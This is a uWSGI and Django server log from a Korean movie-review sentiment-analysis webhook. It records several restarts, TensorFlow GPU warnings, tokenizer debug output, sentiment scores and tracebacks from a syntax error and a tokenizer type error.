[pid: 1673|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 11:59:34 2020] POST /webhook/ => generated 38 bytes in 17200 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:01:47 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560798ff1cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x560798ff1cf0 pid: 1777 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1777, cores: 1)
2020-08-28 12:01:57.158335: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:01:57.158371: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 12:02:05.490084: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:02:05.490114: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:02:05.490130: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:02:05.490346: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:02:05.515041: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:02:05.515401: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56079df05e10 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:02:05.515420: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:02:05.806153: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:02:05.807774: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:02:05.809133: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
2020-08-28 12:02:10.071387: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:02:10.377758: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:02:10.379256: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:02:10.380671: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
91.92% 확률로 긍정 리뷰입니다.

[pid: 1777|app: 0|req: 1/1] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:01:56 2020] POST /webhook/ => generated 38 bytes in 13790 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 1777|app: 0|req: 2/2] 193.118.53.194 () {36 vars in 501 bytes} [Fri Aug 28 12:03:43 2020] GET / => generated 1365 bytes in 23 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
91.92% 확률로 긍정 리뷰입니다.

[pid: 1777|app: 0|req: 3/3] 66.249.84.11 () {42 vars in 540 bytes} [Fri Aug 28 12:05:24 2020] POST /webhook/ => generated 38 bytes in 53 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
91.92% 확률로 긍정 리뷰입니다.

[pid: 1777|app: 0|req: 4/4] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:05:59 2020] POST /webhook/ => generated 38 bytes in 50 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[2, 3141, 93]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    2
  3141   93]]
91.92% 확률로 긍정 리뷰입니다.

[pid: 1777|app: 0|req: 5/5] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:11:40 2020] POST /webhook/ => generated 38 bytes in 49 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:11:58 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5560b13e7cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5560b13e7cf0 pid: 1921 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 1921, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 56
    }
    ^
SyntaxError: invalid syntax
[pid: 1921|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:12:05 2020] POST /webhook/ => generated 101847 bytes in 74 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
2020-08-28 12:14:27.383809: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:27.383846: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 12:14:33.879773: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:33.879805: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:14:33.879821: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:14:33.880034: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:14:33.907047: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:14:33.907443: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5560b6560260 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:14:33.907463: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:14:34.196175: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:14:34.197605: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:14:34.198997: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:14:40 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x555c65ac7cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x555c65ac7cf0 pid: 2008 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2008, cores: 1)
2020-08-28 12:14:47.816366: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:47.816399: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 12:14:54.228840: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:14:54.228871: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:14:54.228885: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:14:54.229094: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:14:54.255021: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:14:54.255397: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x555c6ac37770 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:14:54.255414: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:14:54.546265: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:14:54.547731: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:14:54.549112: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[1, 3140, 92]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    1
  3140   92]]
2020-08-28 12:14:58.806710: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-08-28 12:14:59.117111: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:14:59.118597: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:14:59.120055: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
86.66% 확률로 부정 리뷰입니다.

[pid: 2008|app: 0|req: 1/1] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:14:47 2020] POST /webhook/ => generated 22 bytes in 11873 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['이', '영화', '개꿀잼', 'ㅋㅋㅋ']
['영화', '개꿀잼', 'ㅋㅋㅋ']
[[1, 3140, 92]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    1
  3140   92]]
86.66% 확률로 부정 리뷰입니다.

[pid: 2008|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:15:10 2020] POST /webhook/ => generated 22 bytes in 57 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:18:35 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x563c96493cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x563c96493cf0 pid: 2110 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2110, cores: 1)
2020-08-28 12:18:45.115587: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-28 12:18:45.115622: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
파일열기시작
파일열기끝
2020-08-28 12:18:51.626091: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-28 12:18:51.626120: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-28 12:18:51.626135: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-28 12:18:51.626345: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-28 12:18:51.651046: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-08-28 12:18:51.651415: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x563c9b60be80 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-28 12:18:51.651431: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-28 12:18:51.942103: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-28 12:18:51.943576: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-28 12:18:51.944965: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 40, in webhook
    return welcome(params)
  File "./haniumapp/views.py", line 51, in welcome
    score,flag =  nlp.sentiment_predict(params)
  File "./haniumapp/nlp.py", line 71, in sentiment_predict
    new_sentence = okt.morphs(new_sentence, stem=True) # 토큰화
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 78, in morphs
    return [s for s, t in self.pos(phrase, norm=norm, stem=stem)]
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 63, in pos
    jpype.java.lang.Boolean(stem)).toArray()
TypeError: No matching overloads found for kr.lucypark.okt.OktInterface.tokenize(dict,java.lang.Boolean,java.lang.Boolean), options are:
	public java.util.List kr.lucypark.okt.OktInterface.tokenize(java.lang.String,java.lang.Boolean,java.lang.Boolean)


Fri Aug 28 12:18:52 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.249.84.13) !!!
Fri Aug 28 12:18:52 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.249.84.13)
OSError: write error
[pid: 2110|app: 0|req: 1/1] 66.249.84.13 () {42 vars in 540 bytes} [Fri Aug 28 12:18:44 2020] POST /webhook/ => generated 32612 bytes in 7565 msecs (HTTP/1.1 500) 5 headers in 156 bytes (0 switches on core 0)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 40, in webhook
    return welcome(params)
  File "./haniumapp/views.py", line 51, in welcome
    score,flag =  nlp.sentiment_predict(params)
  File "./haniumapp/nlp.py", line 71, in sentiment_predict
    new_sentence = okt.morphs(new_sentence, stem=True) # 토큰화
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 78, in morphs
    return [s for s, t in self.pos(phrase, norm=norm, stem=stem)]
  File "/usr/local/lib/python3.6/dist-packages/konlpy/tag/_okt.py", line 63, in pos
    jpype.java.lang.Boolean(stem)).toArray()
TypeError: No matching overloads found for kr.lucypark.okt.OktInterface.tokenize(dict,java.lang.Boolean,java.lang.Boolean), options are:
	public java.util.List kr.lucypark.okt.OktInterface.tokenize(java.lang.String,java.lang.Boolean,java.lang.Boolean)


[pid: 2110|app: 0|req: 2/2] 66.249.84.9 () {42 vars in 539 bytes} [Fri Aug 28 12:21:02 2020] POST /webhook/ => generated 79944 bytes in 51 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Fri Aug 28 12:35:06 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x561579b89cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x561579b89cf0 pid: 2201 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 2201, cores: 1)
2020-08-28 12:35:18.145426: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
